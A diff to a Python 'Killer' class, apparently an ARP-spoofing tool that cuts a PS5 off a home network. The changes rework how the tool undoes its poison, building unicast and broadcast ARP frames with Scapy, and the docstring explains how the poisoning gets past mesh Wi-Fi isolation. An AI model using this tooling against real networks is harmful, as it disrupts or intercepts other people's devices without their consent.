@@ -1454,15 +1454,16 @@ class Killer:
             self.prewarm_l2_socket(join_ms=0)
 
     def _restore_frames(self, victim):
-        """Honest unicast ARP replies — same restore that worked before mesh broadcasts.
+        """Undo poison with the same delivery Kill ON used.
 
-        Broadcast / GARP / who-has-from-PS5 restore was added for Starlink mesh.
-        Those frames leave this PC as Ethernet source while claiming the console
-        IP, which re-teaches the router/AP that the PS5 is here. Analysis AFTER
-        already showed restore ARPs on the wire and still 0 WAN / return HTTPS
-        stuck on this PC.
+        The PS5 is on ethernet; this PC is on mesh Wi‑Fi. Isolation drops
+        STA unicast, which is why poison uses victim-targeted L2 broadcast.
+        Unicast-only restore never reaches the console — it stays on the fake
+        gateway until the ethernet link flaps.
 
-        Do not send restore if the gateway MAC has collapsed to this PC.
+        Broadcast copies are the poison shape with honest ``hwsrc=router_mac``
+        and ``pdst=victim`` (not a GARP). Do not broadcast ``psrc=victim_ip``
+        from this PC — that re-teaches the router the PS5 is here.
         """
         src = self._poison_hwsrc()
         router_ip, router_mac = self._restore_router_endpoint()
@@ -1472,23 +1473,71 @@ class Killer:
             return []
         if not router_ip or not mac_address_is_usable(router_mac):
             return []
-        to_victim = Ether(src=src, dst=victim_mac) / ARP(
+        to_victim_req = Ether(src=src, dst=victim_mac) / ARP(
+            op=1,
+            psrc=router_ip,
+            hwsrc=router_mac,
+            pdst=victim_ip,
+            hwdst=victim_mac,
+        )
+        to_victim_reply = Ether(src=src, dst=victim_mac) / ARP(
             op=2,
             psrc=router_ip,
             hwsrc=router_mac,
             pdst=victim_ip,
             hwdst=victim_mac,
         )
-        to_router = Ether(src=src, dst=router_mac) / ARP(
+        to_router_req = Ether(src=src, dst=router_mac) / ARP(
+            op=1,
+            psrc=victim_ip,
+            hwsrc=victim_mac,
+            pdst=router_ip,
+            hwdst=router_mac,
+        )
+        to_router_reply = Ether(src=src, dst=router_mac) / ARP(
             op=2,
             psrc=victim_ip,
             hwsrc=victim_mac,
             pdst=router_ip,
             hwdst=router_mac,
         )
-        # Router-side twice: inbound MITM (return path) is what leaves the PS5
-        # looking killed after OFF if it is not undone.
-        return [to_victim, to_router, to_router]
+        frames = [
+            to_victim_req,
+            to_victim_reply,
+            to_router_req,
+            to_router_reply,
+            to_router_req,
+            to_router_reply,
+        ]
+        try:
+            from tools.mitm_probe import iface_is_wireless
+
+            wifi = iface_is_wireless(self.iface)
+        except Exception:
+            wifi = False
+        if wifi:
+            bcast = 'ff:ff:ff:ff:ff:ff'
+            frames.extend(
+                [
+                    Ether(src=src, dst=bcast)
+                    / ARP(
+                        op=1,
+                        psrc=router_ip,
+                        hwsrc=router_mac,
+                        pdst=victim_ip,
+                        hwdst=victim_mac,
+                    ),
+                    Ether(src=src, dst=bcast)
+                    / ARP(
+                        op=2,
+                        psrc=router_ip,
+                        hwsrc=router_mac,
+                        pdst=victim_ip,
+                        hwdst=victim_mac,
+                    ),
+                ]
+            )
+        return frames
 
     def _restore_arp_now(self, victim, seq=0, repeats=1, delay_s=0.1):
         """Best-effort ARP restore; aborts if a newer op supersedes this sequence."""
@@ -1522,6 +1571,7 @@ class Killer:
                 (0.5, 2),
                 (1.0, 2),
                 (2.5, 3),
+                (5.0, 3),
             )
         for wait_s, repeats in plan:
             if self._op_seq.get(victim['mac']) != seq or victim['mac'] in self.killed:
